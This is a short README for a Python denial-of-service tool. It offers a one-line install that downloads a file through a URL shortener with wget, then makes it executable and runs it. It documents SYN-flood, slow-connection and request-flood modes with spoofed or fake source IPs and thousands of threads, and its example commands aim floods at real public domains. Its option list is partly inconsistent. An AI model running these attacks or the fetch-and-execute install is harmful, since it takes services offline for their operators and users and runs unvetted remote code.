# Python3 ddos script

## install:

### wget is.gd/ddosnow && chmod +x ddosnow && ./ddosnow

## usage: ./pyddos -t [target] -p [port] -t [number threads] 
optional arguments: -h, --help show this help message and 
exit -v, --version show program's version number and exit 
options: -d <ip|domain> Specify your target such an ip or 
domain name -t <float> Set timeout for socket -T <int> 
Set threads number for connection (default = 1000) -p 
<int> Specify port target (default = 80) |Only required 
with pyslow attack| -s <int> Set sleep time for 
reconnection -i <ip address> Specify spoofed ip unless 
use fake ip -Request Enable request target -Synflood 
Enable synflood attack -Pyslow Enable pyslow attack 
--fakeip Option to create fake ip if not specify spoofed 
ip Example:
     ./pyddos -d www.example.com -p 80 -T 2000 -Pyslow
    ./pyddos -d www.domain.com -s 100 -Request
    ./pyddos -d www.google.com -Synflood -T 5000 -t 10.0
